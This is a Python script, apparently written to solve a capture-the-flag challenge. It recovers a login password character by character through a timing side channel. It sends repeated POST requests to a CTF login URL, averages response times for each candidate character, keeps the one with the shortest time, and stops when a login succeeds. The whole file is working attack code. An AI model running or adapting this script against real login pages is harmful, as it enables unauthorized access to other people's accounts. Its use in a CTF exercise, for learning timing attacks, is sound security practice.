import requests
import string
import time


# Enter **YOUR** unique URL of the Filedesk login page.
LOGIN_URL = "https://lv-1-3155393905.ctf.middesk.com/login"

# Known password prefix
password_prefix = "ctf"

# Characters that may be in the password
allowed_characters = string.ascii_letters + string.digits + "+/"


# Function to attempt a login and measure response time
def attempt_login(password):
    while True:
        try:
            start_time = time.time()
            response = requests.post(LOGIN_URL, data={"password": password}, timeout=1)
            end_time = time.time()
            break
        except requests.exceptions.Timeout:
            print("got timeout, trying again")
    return end_time - start_time, response.status_code


# Function to find the next character of the password
def find_next_char(current_password):
    times = {}
    for char in allowed_characters:
        total_time = 0
        attempts = 3  # Number of attempts to average out network variance

        for _ in range(attempts):
            elapsed, status_code = attempt_login(current_password + char)
            if status_code == 200:
                return char, True
            total_time += elapsed

        avg_ms = int(total_time*1000 / attempts)
        padding = int(avg_ms / 5)
        print(f'{current_password+char} -> {avg_ms:4}ms {" "*padding}*')
        times[char] = avg_ms

    # The character with the shortest response time is likely to be correct
    char, duration = min(times.items(), key=lambda item: item[1])
    print(f'min time char was {char}')

    return char, False


# Start cracking the password
current_password = password_prefix
while True:
    print(f"Current password: {current_password}")
    next_char, cracked = find_next_char(current_password)
    current_password += next_char

    if cracked:
        break

print(f"Password found: {current_password}")
